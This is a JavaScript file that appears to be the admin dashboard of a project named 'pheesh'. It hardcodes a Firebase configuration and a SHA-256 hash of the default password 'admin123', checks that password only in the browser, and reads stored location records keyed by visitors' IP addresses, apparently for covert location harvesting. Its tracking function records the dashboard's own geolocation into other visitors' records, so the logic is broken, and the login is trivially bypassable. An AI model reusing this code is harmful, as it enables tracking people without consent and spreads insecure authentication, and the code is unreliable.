// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
    authDomain: "pheesh-4481e.firebaseapp.com",
    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pheesh-4481e",
    storageBucket: "pheesh-4481e.appspot.com",
    messagingSenderId: "458791455321",
    appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Password hash (default password is "admin123")
const PASSWORD_HASH = '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9';  

function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);                    
    return crypto.subtle.digest('SHA-256', msgBuffer).then(hashBuffer => {
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        return hashHex;
    });
}

async function checkPassword() {
    const password = document.getElementById('password').value;
    const hash = await sha256(password);
    
    if (hash === PASSWORD_HASH) {
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        // Initialize map and load data after successful login
        if (typeof initMap === 'function') initMap();
        if (typeof refreshData === 'function') refreshData();
    } else {
        alert('Incorrect password');
    }
}

// Prevent form submission and handle enter key
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    await checkPassword();
});

// Location tracking functionality
let activeTracking = false;
let trackingRefs = new Map(); // Store tracking references by IP

async function toggleLocationTracking() {
    const trackingCheckbox = document.getElementById('trackLocations');
    activeTracking = trackingCheckbox.checked;
    
    if (activeTracking) {
        startLocationTracking();
    } else {
        stopLocationTracking();
    }
}

async function startLocationTracking() {
    try {
        const snapshot = await database.ref('locations').orderByChild('timestamp').limitToLast(100).once('value');
        snapshot.forEach(childSnapshot => {
            const data = childSnapshot.val();
            if (data.locationSource !== 'IP Geolocation' && !trackingRefs.has(data.ip)) {
                initializeTracking(data.ip, childSnapshot.key);
            }
        });
    } catch (error) {
        console.error('Error starting location tracking:', error);
    }
}

function initializeTracking(ip, locationKey) {
    const watchId = navigator.geolocation.watchPosition(
        (position) => updateUserLocation(position, ip, locationKey),
        (error) => console.error('Watch position error:', error),
        { enableHighAccuracy: true }
    );
    
    trackingRefs.set(ip, {
        watchId: watchId,
        locationKey: locationKey
    });
}

async function updateUserLocation(position, ip, locationKey) {
    try {
        const updateData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            lastUpdate: new Date().toISOString()
        };
        
        await database.ref(`locations/${locationKey}`).update(updateData);
        console.log(`Updated location for IP: ${ip}`);
    } catch (error) {
        console.error('Error updating location:', error);
    }
}

function stopLocationTracking() {
    trackingRefs.forEach((ref, ip) => {
        navigator.geolocation.clearWatch(ref.watchId);
    });
    trackingRefs.clear();
}

// Export database for use in other scripts
window.database = database;
